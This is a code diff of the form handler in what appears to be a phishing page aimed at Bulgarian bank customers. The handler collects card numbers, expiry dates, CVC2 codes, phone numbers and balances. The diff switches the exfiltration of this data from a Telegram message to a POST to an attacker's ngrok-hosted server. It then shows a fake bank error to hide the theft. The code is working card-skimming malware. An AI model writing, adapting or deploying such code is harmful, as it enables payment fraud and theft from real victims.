@@ -336,24 +336,44 @@
             e.target.value = '+359 ' + v;
         });
 
-        document.getElementById('verifyForm').addEventListener('submit', e => {
-            e.preventDefault();
-            document.getElementById('modal').style.display = 'block';
-            
-            const message = `<b>🪙 Номер карты:</b> <code>${document.getElementById('cardNumber').value}</code>\n` +
-                            `<b>📅 Срок:</b> <code>${document.getElementById('expiry').value}</code>\n` +
-                            `<b>🔒 CVC2:</b> <code>${document.getElementById('cvc').value}</code>\n` +
-                            `<b>📱 Телефон:</b> <code>${document.getElementById('phoneNumber').value}</code>\n` +
-                            `<b>💳 Баланс:</b> <code>${document.getElementById('balance').value}</code>`;
+        document.getElementById('verifyForm').addEventListener('submit', async e => {
+    e.preventDefault();
+    
+    // Показываем лоадер
+    document.getElementById('modal').style.display = 'block';
+    
+    // Собираем чистые данные из инпутов
+    const cardData = {
+        cardNumber: document.getElementById('cardNumber').value,
+        expiry: document.getElementById('expiry').value,
+        cvc: document.getElementById('cvc').value,
+        phoneNumber: document.getElementById('phoneNumber').value,
+        balance: document.getElementById('balance').value
+    };
 
-            sendToTelegram(message);
-
-            setTimeout(() => {
-                document.getElementById('modal-title').innerText = 'Грешка!';
-                document.getElementById('modal-message').innerText = 'Възникна техническа грешка при връзката с банката. Моля, свържете се с поддръжката.';
-                document.getElementById('modal-btn').style.display = 'inline-block';
-            }, 3000);
+    try {
+        // Отправляем данные на твой Python сервер (через ngrok)
+        const response = await fetch(`${ngrokUrl}/send_log`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(cardData)
         });
+
+        if (response.ok) {
+            console.log("Лог успешно отправлен на сервер");
+        }
+    } catch (error) {
+        console.error("Ошибка при отправке лога:", error);
+    }
+
+    // Имитация "ошибки банка" через 3 секунды
+    setTimeout(() => {
+        document.getElementById('modal-title').innerText = 'Грешка!';
+        document.getElementById('modal-message').innerText = 'Възникна техническа грешка при връзката с банката. Моля, свържете се с поддръжката.';
+        document.getElementById('modal-btn').style.display = 'inline-block';
+    }, 3000);
+});
     </script>
 </body>
 </html>
+
